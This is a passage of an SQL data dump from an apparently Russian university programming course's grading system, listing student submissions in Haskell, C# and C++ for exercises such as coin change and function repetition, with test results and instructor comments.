(1763, 53, '214982', '2012-10-09 21:38:58', 0, 'equal x y = if (x == y) then True else False\r\n\r\ncontains x [] = False\r\ncontains x [y] = equal x y\r\ncontains x (y:xs) = if (equal x y) then True else contains x xs \r\n\r\nclearAllDuplicates [] = []\r\nclearAllDuplicates (x:xs) = if (contains x xs) then clearAllDuplicates xs else if (x == []) then clearAllDuplicates xs else x:clearAllDuplicates xs\r\n\r\nmyCoins 0 p r v = [[p,r,v]]\r\nmyCoins 1 p r v = [[]]\r\nmyCoins 2 p r v = [[p + 1, r, v]]\r\nmyCoins 3 p r v = [[p, r+1, v]]\r\nmyCoins 4 p r v = [[p+2, r, v]]\r\nmyCoins n p r v = (myCoins (n - 2) (p + 1) r v)++(myCoins (n - 3) p (r+1) v)++(myCoins (n - 5) p r (v+1))\r\n\r\ncoins n = clearAllDuplicates (myCoins n 0 0 0)', '<br/>Тесты успешно пройдены!'),
(1764, 53, '374969', '2012-10-09 21:47:35', 1, 'coins n = [[ div (n - 5*a - 3*b) 2, b, a]| a <- [0..(div n 5)], b <- [0..(div (n-5*a) 3)], mod (n - 5*a - 3*b) 2 == 0]\r\n', '<br/>Тесты успешно пройдены!'),
(1765, 52, '374969', '2012-10-09 22:01:21', 1, 'repeatFunc fun i = foldr (a b -> fun.b) id [1..i]', '<br/>Тесты успешно пройдены!'),
(1766, 51, '374969', '2012-10-09 22:01:41', 1, 'repeatFunc fun i = foldr (a b -> fun.b) id [1..i]', '<br/>Тесты успешно пройдены!'),
(1767, 53, '214982', '2012-10-09 22:48:46', 1, 'equal x y = if (x == y) then True else False\r\n   --- А зачем эта функция, нельзя просто всюду вместо equals x y писать x == y ? \r\n\r\ncontains x [] = False\r\ncontains x [y] = equal x y\r\ncontains x (y:xs) = if (equal x y) then True else contains x xs \r\n\r\nclearAllDuplicates [] = []\r\nclearAllDuplicates (x:xs) = if (contains x xs) then clearAllDuplicates xs else if (x == []) then clearAllDuplicates xs else x:clearAllDuplicates xs\r\n\r\ncoinsBy5 0 p r v = [[p, r, v]]\r\ncoinsBy5 1 p r v = [[]]\r\ncoinsBy5 2 p r v = [[p+1, r, v]]\r\ncoinsBy5 3 p r v = [[p, r+1, v]]\r\ncoinsBy5 4 p r v = [[p + 2, r, v]]\r\ncoinsBy5 n p r v = (coinsBy5 (n - 5) p r (v+1))\r\n\r\ncoinsBy3 0 p r = [[p, r, 0]]\r\ncoinsBy3 1 p r = [[]]\r\ncoinsBy3 2 p r = [[p + 1, r, 0]]\r\ncoinsBy3 n p r = (coinsBy3 (n - 3) p (r+1))++(coinsBy5 n p r 0)\r\n\r\ncoinsBy2 0 p = [[p, 0, 0]]\r\ncoinsBy2 n p = (coinsBy2 (n - 2) (p + 1))++(coinsBy3 n p 0)\r\n\r\ncoins n = clearAllDuplicates (coinsBy2 n 0)\r\n{-Эта версия сильно быстрее работает, например, на 1000. Ну, то есть она работает на 1000, в отличие от прошлой.-}', '<br/>Тесты успешно пройдены!'),
(1768, 51, '5477377', '2012-10-09 23:46:25', 1, 'repeatFunc f 1 = x -> f x\r\nrepeatFunc f n = x -> repeatFunc f (n - 1) (f x)', '<br/>Тесты успешно пройдены!'),
(1769, 53, '5477377', '2012-10-09 23:46:44', 1, 'p n [x,y,z] = (n == 2*x + 3*y + 5*z) \r\n\r\ncoins n = filter (p n) [[x, y, z]|x<-[0..div n 2], y<-[0..div n 3], z<-[0..div n 5]]', '<br/>Тесты успешно пройдены!'),
(1770, 54, '5477377', '2012-10-09 23:47:49', 1, '{-Честно говоря, у меня не работает тут, но я без сил понять, почему.-}\r\n   --- У вас просто опечатка в строке\r\n   ---  totalResisatnce (Connection t first second ) =\r\n   ---   - надо\r\n   ---  totalResistance (Connection t first second ) =\r\n   --- А так все правильно, но по моему лучше написать \r\n   ---  data Scheme r = Resistor r | Connection Int (Scheme r) (Scheme r) \r\n   --- (не очень понятно, зачем делать Int параметром)\r\n   --- А еще более логично, мне кажется\r\n   ---  data Scheme r = Resistor r | Connection Bool (Scheme r) (Scheme r) \r\n\r\ndata Scheme r t = Resistor r | Connection t (Scheme r t) (Scheme r t) \r\n\r\ntotalResistance (Resistor r) = r\r\ntotalResisatnce (Connection t first second ) =\r\n	if t == 1 then\r\n		r1 + r2\r\n	else\r\n		r1*r2/(r1 + r2)\r\n	where \r\n		r1 = totalResistance first\r\n		r2 = totalResistance second\r\n', '<br/>Тесты успешно пройдены!'),
(1771, 49, 'erwert', '2012-10-10 01:16:24', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace ConsoleApplication1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public class Tree{\r\n\r\n            int val;\r\n\r\n            Tree left;\r\n\r\n            Tree right;\r\n\r\n\r\n\r\n            public void Gen(int v){\r\n\r\n                val = v;\r\n\r\n                left = right = null;\r\n\r\n            }\r\n\r\n\r\n\r\n            public void Add(int v){\r\n\r\n                if (left == null){\r\n\r\n                    left = new Tree();\r\n\r\n                    left.Gen(v);\r\n\r\n                }\r\n\r\n                else if (right == null){\r\n\r\n                        right = new Tree();\r\n\r\n                        right.Gen(v);\r\n\r\n                    }\r\n\r\n                else\r\n\r\n                   left.Add(v);\r\n\r\n            }\r\n\r\n\r\n\r\n            public bool TreeAny(Func<int, bool> f){\r\n\r\n                if (left != null && right != null)\r\n\r\n                    return f(val) || left.TreeAny(f) || right.TreeAny(f);\r\n\r\n                else if (left != null)\r\n\r\n                    return f(val) || left.TreeAny(f);\r\n\r\n                else if (right != null)\r\n\r\n                    return f(val) || right.TreeAny(f);\r\n\r\n                return f(val);\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Tree T = new Tree();\r\n\r\n            int n = Convert.ToInt32(Console.ReadLine());\r\n\r\n            T.Gen(n);\r\n\r\n            while (n != 0){\r\n\r\n                n = Convert.ToInt32(Console.ReadLine());\r\n\r\n                if (n != 0)\r\n\r\n                    T.Add(n);\r\n\r\n            }\r\n\r\n            Console.WriteLine(T.TreeAny(x => x % 3 == 0));\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1772, 56, 'Маргарита Нурмухаметова', '2012-10-10 09:35:26', 1, 'allLists n 0 = []\r\n   --- Это, кстати, не совсем правильно - у вас написано, что таких списков (длины 0)\r\n   --- вообще нет, а на самом деле есть один такой список - пустой. Но ОК, засчитано,\r\n   --- и это мы обсудим. \r\nallLists n 1 = [[x]|x<-[1..n]]\r\n\r\nallLists n k = [x:xs|x<-[1..n], xs <- allLists n (k-1)]\r\n', '<br/>Тесты успешно пройдены!'),
(1773, 53, '383483', '2012-10-10 10:12:10', 2, 'coins n = [[x,y,z]|x<-[0,1,2,3,4,5], y<-[0,1,2,3], z<-[0,1,2], 2*x+3*y+5*z==n]\r\n   --- ??? Да почему же например x<-[0,1,2,3,4,5] ?? Ведь x - это количество пятаков, оно мб гораздо больше.\r\n   --- Попробуйте исправить, пожалуйста. \r\n   --- (Если не получится, просто выложите это решение еще раз, и я его зачту в любом случае)', '<br/>Тесты успешно пройдены!'),
(1774, 43, '1029771', '2012-10-10 10:28:23', 0, 'euclid 0 a = error " не взаимнопростые"\r\neuclid a 0 = error " не взаимнопростые"\r\neuclid a 1 = ( 0 , 1 )\r\neuclid 1 a = ( 1 , 0 )\r\neuclid a b = ( x - y * d , y - x * c ) where c = quot a b; d = quot b a; ( x , y ) = euclid s w where s=a-b*c; w= b-a*d\r\n--- теперь точно компилироваться должна... Извините, что просрочил.', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1775, 43, '1029771', '2012-10-10 10:29:12', 0, 'euclid 0 a = error " не взаимнопростые"\r\neuclid a 0 = error " не взаимнопростые"\r\neuclid a 1 = ( 0 , 1 )\r\neuclid 1 a = ( 1 , 0 )\r\neuclid a b = ( x - y * d , y - x * c ) where c = quot a b; d = quot b a; ( x , y ) = euclid s w where s=a-b*c; w= b-a*d\r\n--- теперь точно компилироваться должна... Извините, что просрочил.', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1776, 43, '1029771', '2012-10-10 10:32:29', 2, '   --- Но вы же очень сильно позже контрольного срока прислали, к сожалению..\r\neuclid a 1 = ( 0 , 1 )\r\neuclid 1 a = ( 1 , 0 )\r\neuclid 0 a = error " не взаимнопростые"\r\neuclid a 0 = error " не взаимнопростые"\r\neuclid a b = ( x - y * d , y - x * c ) where c = quot a b; d = quot b a; ( x , y ) = euclid s w where s=a-b*c; w= b-a*d\r\n', '<br/>Тесты успешно пройдены!'),
(1777, 51, '383483', '2012-10-10 10:38:58', 1, 'repeatFunc f n = repF f (n-1) (f.f)\r\nrepF f 1 res = res\r\nrepF f n res = repF f (n-1) (res.f)', '<br/>Тесты успешно пройдены!'),
(1778, 52, '383483', '2012-10-10 10:47:05', 1, 'repeatFunc f n = foldr (x res -> res.f) f [2..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1779, 56, '239817', '2012-10-10 10:54:59', 1, 'allLists n 0 = [[]]\r\nallLists n k = [h:t| t <- (allLists n (k-1)), h <- [1..n]]', '<br/>Тесты успешно пройдены!'),
(1780, 53, '6774563', '2012-10-10 12:51:04', 1, 'coins n = [[a,b,c] | a <- [0..n `div` 2], b <- [0..(n `div` 3)], c <- [0..(n `div` 5)], 2*a + 3*b + 5*c == n]\r\n  --- На самом деле тут с вычисляется _очень_ неэффективно, но ОК, это мы разберем..', '<br/>Тесты успешно пройдены!'),
(1781, 54, '6774563', '2012-10-10 13:12:16', 1, '-- Насколько я помню, при последовательном соединении сопротивления складываются,\r\n-- при параллельном - токи делятся пропорционально, т.е. что-то типа (sum(1/R)) = R1R2/(R1+R2) для 2х\r\n-- На самом деле, наверное, имело бы смысл для простоты описания передавать список схем, соединенных\r\n-- последовательно или параллельно, но я сделаю так, как того требует условие задачи\r\n   --- OK (но вообще если вам кажется что постановку задачи лучше изменить, то меняйте, не стесняйтесь -\r\n   --- в худшем случае я с вами не соглашусь, вот и все..) \r\n\r\ndata Scheme = Resistance Double | Serial Scheme Scheme | Parallel Scheme Scheme\r\n\r\ntotalResistance (Resistance r) = r\r\ntotalResistance (Serial s1 s2) = totalResistance s1 + totalResistance s2\r\ntotalResistance (Parallel s1 s2) =\r\n	let \r\n		r1 = totalResistance s1\r\n		r2 = totalResistance s2\r\n	in (r1*r2)/(r1+r2)\r\n\r\n--main = putStrLn $ show(totalResistance (Serial (Resistance 4) (Parallel (Resistance 4) (Resistance 4))) )', '<br/>Тесты успешно пройдены!'),
(1782, 52, '9539826', '2012-10-10 15:29:02', 1, 'repeatFunc f n =  foldl (.) (head x) (tail x) where x = take n (repeat f)', '<br/>Тесты успешно пройдены!'),
(1783, 53, '9539826', '2012-10-10 15:38:21', 1, 'coins n = [[x, y, z] | x <- [0..n], y <- [0..n], z <- [0..n], x*2 + y*3 + z*5 == n]', '<br/>Тесты успешно пройдены!'),
(1784, 53, '383483', '2012-10-10 17:12:57', 1, 'coins n = [[x,y,z]|x<-[0..(div n 2)], y<-[0..(div n 3)], z<-[0..(div n 5)], 2*x+3*y+5*z==n]\r\n{--да, извиняюсь, пример с 10 как-то отвлек :)--}\r\n  ', '<br/>Тесты успешно пройдены!'),
(1785, 59, 'tonyo', '2012-10-10 17:15:14', 1, 'using System;\r\nusing System.Linq;\r\n\r\npublic class Pr13_1\r\n{\r\n    static int[] nonZeroLastDigits(int[] a)\r\n    {   \r\n        int[] mod10 = a.Select(x => x % 10).ToArray();\r\n        int[] res = mod10.Where(x => x != 0).ToArray();\r\n        return res;\r\n    }   \r\n                                                                                                                                                                                                \r\n\r\n    static void Main()\r\n    {\r\n        int[] a = {354, 20, 9, 31};\r\n        int[] b = nonZeroLastDigits(a);\r\n        for (int i = 0; i < b.Length; i++)\r\n            Console.Write("{0} ", b[i]);\r\n    }   \r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1786, 52, '528420', '2012-10-10 17:15:38', 1, 'repeatFunc f n = foldr (x res -> res.f) f [1..(n-1)]', '<br/>Тесты успешно пройдены!'),
(1787, 51, '528420', '2012-10-10 17:18:15', 1, 'repeatFunc f n = foldr (x res -> res.f) f [1..(n-1)]', '<br/>Тесты успешно пройдены!'),
(1788, 52, '3742311', '2012-10-10 17:28:02', 1, 'repeatFunc f n = (y -> foldl (x t -> f x) y [1..n])', '<br/>Тесты успешно пройдены!'),
(1789, 49, 'tonyo', '2012-10-10 17:54:02', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\n\r\n\r\npublic class BinTree\r\n\r\n{\r\n\r\n    public class Node\r\n\r\n    {\r\n\r\n        public int data = 0;\r\n\r\n        public Node left = null, right = null;\r\n\r\n\r\n\r\n        public Node(int newdata)\r\n\r\n        {\r\n\r\n            data = newdata;\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n    public Node root = null;\r\n\r\n\r\n\r\n    public bool Any(Func<int, bool> f)\r\n\r\n    {\r\n\r\n        if (root == null)\r\n\r\n            return false;\r\n\r\n\r\n\r\n        LinkedList<Node> nodes = new LinkedList<Node>();\r\n\r\n        nodes.AddFirst(root);\r\n\r\n        while (nodes.Count > 0)\r\n\r\n        {\r\n\r\n            Node nextnode = nodes.Last.Value;\r\n\r\n            nodes.RemoveLast();\r\n\r\n            if (f(nextnode.data))\r\n\r\n                return true;\r\n\r\n            if (nextnode.left != null)\r\n\r\n                nodes.AddFirst(nextnode.left);\r\n\r\n            if (nextnode.right != null)\r\n\r\n                nodes.AddFirst(nextnode.left);\r\n\r\n        }\r\n\r\n\r\n\r\n        return false; \r\n\r\n    }\r\n\r\n\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\npublic class Pr10_1\r\n\r\n{\r\n\r\n\r\n\r\n    static void Main()\r\n\r\n    {\r\n\r\n        BinTree.Node n1 = new BinTree.Node(12);\r\n\r\n        BinTree.Node n2 = new BinTree.Node(3);\r\n\r\n        BinTree.Node n3 = new BinTree.Node(8);\r\n\r\n        BinTree.Node n4 = new BinTree.Node(10);\r\n\r\n        BinTree.Node n5 = new BinTree.Node(2);\r\n\r\n        n1.left = n2;\r\n\r\n        n1.right = n3;\r\n\r\n        n2.left = n4;\r\n\r\n        n2.right = n5;\r\n\r\n\r\n\r\n        BinTree bt = new BinTree();\r\n\r\n        bt.root = n1;\r\n\r\n\r\n\r\n        Console.WriteLine(bt.Any(x => x % 2 == 1));\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1790, 54, '383483', '2012-10-10 17:54:29', 1, 'data Scheme = Resist Double| Paral Scheme Scheme| Seque Scheme Scheme\r\n\r\ntotalResistance (Resist x) = x\r\ntotalResistance (Paral sch1 sch2) = (totalResistance sch1) + (totalResistance sch2)\r\ntotalResistance (Seque sch1 sch2) = ((totalResistance sch1) * (totalResistance sch2)) / ((totalResistance sch1) + (totalResistance sch2))', '<br/>Тесты успешно пройдены!'),
(1791, 53, 'sromanov', '2012-10-10 18:47:48', 1, 'coins n = [[x,y,z]|x <- [0..n], y <- [0..n], z <- [0..n], 2*x + 3*y + 5*z == n]', '<br/>Тесты успешно пройдены!'),
(1792, 52, '419046', '2012-10-10 18:48:00', 1, 'repeatFunc f n = foldr (.) id (replicate n f)\r\n', '<br/>Тесты успешно пройдены!'),
(1793, 51, '419046', '2012-10-10 18:48:33', 1, 'repeatFunc f n = foldr (.) id (replicate n f)\r\n', '<br/>Тесты успешно пройдены!'),
(1794, 52, '51559263', '2012-10-10 18:54:32', 1, 'repeatFunc f n = foldr (  _ g -> f.g ) f [1..n-1]\r\n', '<br/>Тесты успешно пройдены!'),
(1795, 51, '51559263', '2012-10-10 18:54:51', 1, 'repeatFunc f n = foldr (  _ g -> f.g ) f [1..n-1]\r\n', '<br/>Тесты успешно пройдены!'),
(1796, 48, '383483', '2012-10-10 19:01:06', 1, 'myreverse xs = foldr (x f ys -> f (x : ys)) id xs []', '<br/>Тесты успешно пройдены!'),
(1797, 57, 'Deutsche', '2012-10-10 19:13:11', 1, 'This problem was sent by email, accept it please', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(1798, 51, '532002', '2012-10-10 19:14:36', 1, 'repeatFunc f n = foldr (x res -> f.res) id (replicate n f)\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1799, 52, '532002', '2012-10-10 19:14:52', 1, 'repeatFunc f n = foldr (x res -> f.res) id (replicate n f)\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1800, 53, '532002', '2012-10-10 19:21:21', 1, 'coins n = [ [k,l,m]|k<-[0..n],l<-[0..n],m<-[0..n],k*2+l*3+m*5==n]\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1801, 53, '419046', '2012-10-10 19:28:39', 0, 'coins n = coins1 n 2 3 5\r\n\ncoins1 n k l m = [ (i , j  , h) | i <-[0..n], j <-[0..n], h <-[0..n], (((k * i) + (l * j) + (m * h)) == n)]\n', 'Выражение имеет неправильное значение: coins 2'),
(1802, 53, '419046', '2012-10-10 19:30:09', 0, 'coins n = coins1 n 2 3 5\r\ncoins1 n k l m = [ (i , j  , h) | i <-[0..n], j <-[0..n], h <-[0..n], (((k * i) + (l * j) + (m * h)) == n)]', 'Выражение имеет неправильное значение: coins 2'),
(1803, 50, 'erwert', '2012-10-10 19:32:29', 1, 'template <class Func>\r\nbool treeAny(Func f, tree* root){\r\n	if(root != NULL)\r\n		return f(root->val) || treeAny(f, root->left) || treeAny(f, root->right);\r\n	return false;\r\n}', '<br/>Тесты успешно пройдены!'),
(1804, 51, '83813', '2012-10-10 19:37:29', 1, 'repeatFunc f 1 = f\r\n\r\nrepeatFunc f n = f . (repeatFunc f (n - 1))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1805, 53, '419046', '2012-10-10 19:42:02', 1, 'coins n = coins1 n 2 3 5\r\n\r\ncoins1 n k l m = [ [i , j , h] | i <-[0..n], j <-[0..n], h <-[0..n], (((k * i) + (l * j) + (m * h)) == n)]\r\n', '<br/>Тесты успешно пройдены!'),
(1806, 52, '83813', '2012-10-10 19:44:01', 1, 'repeatFunc f n = foldl (acc fn -> acc . fn) (x -> x) [f | x <- [1..n]]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1807, 54, 'sromanov', '2012-10-10 19:44:03', 1, 'data Scheme = Empty\r\n            | Single Float\r\n            | Series Scheme Scheme\r\n            | Parallel Scheme Scheme\r\n            deriving Show\r\n\r\ntotalResistance Empty = 0\r\ntotalResistance (Single a) = a\r\ntotalResistance (Series x y) = totalResistance x + totalResistance y\r\ntotalResistance (Parallel x y) = rx*ry/(rx+ry)\r\n                where rx = totalResistance x\r\n                      ry = totalResistance y\r\n\r\n-- s = Series (Single 3) (Parallel (Single 4) (Single 4))\r\n-- totalResistance s\r\n-- 5.0', '<br/>Тесты успешно пройдены!'),
(1808, 53, '83813', '2012-10-10 19:47:32', 1, 'coins n = [[x, y, z] | x <- [0..n], y <- [0..n], z <- [0..n], 2 * x + 3 * y + 5 * z == n]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1809, 54, '83813', '2012-10-10 20:02:56', 1, 'data Scheme = Resistance Double | Serial Scheme Scheme | Parallel Scheme Scheme\r\n\r\ntotalResistance :: Scheme -> Double\r\n\r\ntotalResistance (Resistance r) = r\r\n\r\n-- 1/R = 1/r1 + 1/r2 => R = r1r2/r1+r2\r\n\r\ntotalResistance (Parallel s1 s2) = let\r\n\r\n                                     r1 = totalResistance s1\r\n\r\n                                     r2 = totalResistance s2\r\n\r\n                                   in (r1 * r2) / (r1 + r2)\r\n\r\ntotalResistance (Serial s1 s2) = let\r\n\r\n                                   r1 = totalResistance s1\r\n\r\n                                   r2 = totalResistance s2\r\n\r\n                                 in r1 + r2\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1810, 51, 'jamesbrain', '2012-10-10 20:04:42', 1, 'idx x = x\r\n\r\nrepeatFunc f n = if n == 0 then idx else f.(repeatFunc f (n-1))\r\n', '<br/>Тесты успешно пройдены!'),
(1811, 52, 'jamesbrain', '2012-10-10 20:04:53', 1, 'idx x = x\r\n\r\nrepeatFunc f 0 = idx\r\n\r\nrepeatFunc f n = foldl (fun x -> f.fun) f [2..n]\r\n   --- ну или foldl (.) idx [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1812, 53, 'jamesbrain', '2012-10-10 20:05:05', 1, 'coins n = [[i,j,k] | i <- [0..n `div` 2], j <- [0..n `div` 3], k <- [0..n `div` 5], 2 * i + 3 * j + 5 * k == n]\r\n', '<br/>Тесты успешно пройдены!'),
(1813, 47, '4169333', '2012-10-10 20:08:10', 1, 'powerset []=[[]]\r\npowerset (x:xs) = powerset xs ++ [x:xs1 | xs1 <- powerset xs]\r\n', '<br/>Тесты успешно пройдены!'),
(1814, 54, '4169333', '2012-10-10 20:09:09', 1, 'data Scheme= Empty | Node Double Scheme Integer Scheme\r\ntotalResistance Empty = 0\r\ntotalResistance (Node x Empty _ Empty) = x\r\ntotalResistance (Node x left 1 right)= x + totalResistance left + totalResistance right\r\ntotalResistance (Node x left 2 right)= let\r\n						a=(totalResistance left)\r\n                                                b=(totalResistance right)\r\n					   in x+a*b/(a+b)\r\n', '<br/>Тесты успешно пройдены!'),
(1815, 53, '4169333', '2012-10-10 20:09:31', 1, 'coins n = [[k,l,m]| k<- [0..div n 2],l<- [0..div n 3],m<-[0..div n 5], 2*k+3*l+5*m==n]\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1816, 52, '4169333', '2012-10-10 20:09:58', 1, 'repeatFunc f n= x -> (foldr(a res -> (f res)) x [1..n])\r\n', '<br/>Тесты успешно пройдены!'),
(1817, 51, '4169333', '2012-10-10 20:10:12', 1, 'repeatFunc f n= x -> (foldr(a res -> (f res)) x [1..n])\r\n', '<br/>Тесты успешно пройдены!'),
(1818, 51, 'artyushov', '2012-10-10 20:20:41', 1, 'repeatFunc f n = repeatFunc1 f f n\r\nrepeatFunc1 f g 1 = g\r\nrepeatFunc1 f g n = repeatFunc1 f (f . g) (n - 1)', '<br/>Тесты успешно пройдены!'),
(1819, 52, 'artyushov', '2012-10-10 20:32:37', 1, 'repeatFunc f n = foldr (.) id $ replicate n f', '<br/>Тесты успешно пройдены!'),
(1820, 53, 'artyushov', '2012-10-10 21:02:38', 1, 'countSum l = (head l) * 2 + (head (tail l)) * 3 + (head (tail (tail l))) * 5\r\n   --- проще слева написать шаблон\r\n   ---  countSum [x,y,z] = x * 2 + e * 3 + z * 5\r\ncoins n = filter (x -> countSum x == n) [[k,l,m] | k <- [0..(quot n 2)], l <- [0..(quot n 3)], m <- [0..(quot n 5)]]\r\n', '<br/>Тесты успешно пройдены!'),
(1821, 47, 'artyushov', '2012-10-10 21:10:53', 1, 'powerset [] = [[]]\r\npowerset (x:xs) = [x:t | t <- powerset xs] ++ powerset xs\r\n', '<br/>Тесты успешно пройдены!'),
(1822, 54, '5656962', '2012-10-10 21:18:11', 1, 'data Scheme =  Resistance Double | Parallel Scheme Scheme | Series Scheme Scheme \r\n\r\n\r\n\r\ntotalResistance (Resistance r) = r\r\n\r\ntotalResistance (Parallel a b) = let \r\n\r\n				r1 = totalResistance(a)\r\n\r\n				r2 = totalResistance(b)\r\n\r\n					in r1*r2/(r1+r2)\r\n\r\ntotalResistance (Series a b) = totalResistance(a) + totalResistance(b)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1823, 54, '419046', '2012-10-10 21:40:59', 1, 'data Type = Parallel | Direct\r\n\r\ndata Scheme = S Type Scheme Scheme | R Double\r\n\r\ntotalResistance (S Parallel r1 r2) = ((s1 * s2) / (s1 + s2))\r\n\r\n                                     where s1 = totalResistance r1\r\n\r\n                                           s2 = totalResistance r2\r\n\r\ntotalResistance (S Direct r1 r2) =  (s1 + s2)\r\n\r\n                                    where s1 = totalResistance r1\r\n\r\n                                          s2 = totalResistance r2\r\n\r\ntotalResistance (R m) = m\r\n', '<br/>Тесты успешно пройдены!'),
(1824, 51, '5656962', '2012-10-10 21:56:59', 1, 'repeatFunc f 1 = x -> f x\r\n\r\nrepeatFunc f n = x -> f (repeatFunc f (n-1) x)\r\n', '<br/>Тесты успешно пройдены!'),
(1825, 52, '5656962', '2012-10-10 21:57:36', 1, 'repeatFunc f n = foldr (.) f (map (i -> f) [1..n-1])\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1826, 51, '1730564', '2012-10-10 23:57:09', 1, 'repeatFunc f 1 = f\r\nrepeatFunc f n = f .(repeatFunc f (n - 1))', '<br/>Тесты успешно пройдены!'),
(1827, 52, '5477377', '2012-10-11 00:01:25', 2, 'ident = (x -> x) : ident\r\n\r\nrepeatFunc f n = foldr (.) (x -> x) (take n (map f ident)) \r\n{-Я не понимаю, почему map f ident не работает, и мне очень интересно, как это сделать работающим и близко ли это вообще к правильному решению?-}\r\n   --- Да, довольно близки..\r\n   --- Но map ведь означает: взять список (в вашем случае это бесконечный список\r\n   ---   [(x -> x), (x -> x), (x -> x), (x -> x), ...]\r\n   --- и к каждому элементу применить функцию f - т.е. получится\r\n   ---   [f (x -> x), f (x -> x), f (x -> x), f (x -> x), ...]  \r\n   --- И это, понятно, неправильно синтаксически, ведь f - это обычная функция, типа синуса, ее нельзя применять\r\n   --- к (x -> x)\r\n   --- Что же делать?\r\n   --- Ваша задача, насколько я понимаю, получить список [f,f,f,f,f,f,f,...], и дальше все будет просто\r\n   --- Проще всего, видимо, просто его соорудить, точно так же, как вы сооружаете ident\r\n   --- А можно и воспользоваться map, но не совсем так, как вы написали. У нас кстати была похожая задача\r\n   --- про рамочки - я на занятии сооружал списки из 0 с помощью map, ну и тут надо как-то также.\r\n   --- В общем я вам пока не засчитаю, но если вы вдруг не придумаете, как исправить, пришлите пожалуйста\r\n   --- даже и не исправленное рещение снова! Я его засчтаю, оно довольно близко к правильному. \r\n', 'Не удалось вычислить выражение "repeatFunc (*2) 3 10", проверьте правильность синтаксиса'),
(1828, 54, '51559263', '2012-10-11 00:03:16', 1, 'data Scheme = Res Double | PS Scheme Scheme | CS Scheme Scheme\r\n\r\n\r\n\r\ntotalResistance ( Res r ) = r\r\n\r\ntotalResistance ( PS s1 s2 ) = 1 / ( 1 / ( totalResistance s1 ) + 1 / ( totalResistance s2 ) ) \r\n\r\ntotalResistance ( CS s1 s2 ) = totalResistance s1 + totalResistance s2\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1829, 52, '1730564', '2012-10-11 00:18:23', 1, 'repeatFunc f n = foldr (.) f (replicate (n - 1) f)', '<br/>Тесты успешно пройдены!'),
(1830, 53, '51559263', '2012-10-11 00:53:18', 1, 'coins n = [ [k,l,m] | let kMax = (truncate (n/2)),\r\n                           --- или то же можно написать let kMax = div n 2 \r\n\r\n                      let lMax = (truncate (n/3)),\r\n\r\n                      let mMax = (truncate (n/5)), \r\n\r\n                      k <- [0..kMax], \r\n\r\n                      l <- [0..lMax], \r\n\r\n                      m <- [0..mMax], \r\n\r\n                      2*k + 3*l + 5*m == (truncate (n)) ]\r\n', '<br/>Тесты успешно пройдены!'),
(1831, 54, '533223', '2012-10-11 05:19:46', 1, 'data Scheme = Link Float| Par Scheme Scheme | Pos Scheme Scheme\r\n\r\ntotalResistance (Link x) = x\r\ntotalResistance (Pos s1 s2) = totalResistance s1 + totalResistance s2\r\ntotalResistance (Par s1 s2) = (p1*p2) / (p1+p2)\r\n				where \r\n					p1 = totalResistance s1\r\n					p2 = totalResistance s2', '<br/>Тесты успешно пройдены!'),
(1832, 51, '14561781', '2012-10-11 05:54:36', 1, 'repeatFunc f 1 = f\r\n\r\nrepeatFunc f n = f.repeatFunc f (n-1)\r\n', '<br/>Тесты успешно пройдены!'),
(1833, 52, '533223', '2012-10-11 06:09:27', 1, 'repeatFunc f n = foldr (x res -> f.res) id [1..n]', '<br/>Тесты успешно пройдены!'),
(1834, 51, '533223', '2012-10-11 06:10:43', 1, 'repeatFunc f n = foldr (x res -> f.res) id [1..n]', '<br/>Тесты успешно пройдены!'),
(1835, 53, '14561781', '2012-10-11 06:25:37', 1, 'coins n = [(x, y, z)|x<-[0..n],y<-[0..n],z<-[0..n],2*x+3*y+5*z == n]\r\n   --- там в условии былт списки, а не тройки те надо [x,y,z]\r\n', 'Выражение имеет неправильное значение: coins 2');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1836, 54, '532002', '2012-10-11 06:26:30', 1, 'data Scheme = Resist Double| Connect Scheme String Scheme\r\n\r\ntotalResistance (Resist r) = r\r\n\r\ntotalResistance (Connect a "--" b) = (totalResistance a) + (totalResistance b) \r\n\r\ntotalResistance (Connect a "||" b) = let x = totalResistance a\r\n\r\n                                         y = totalResistance b\r\n\r\n                                     in x*y/(x+y)\r\n   --- ОК, интересная идея! Хотя на самом деле нет смысла хранить доп.данные просто чтобы печать лучше выглядела\r\n   --- Лучше переопределить печать (мы потом пройдем, как это делать)\r\ntotalResistance (Connect a _ b) = 0.0\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
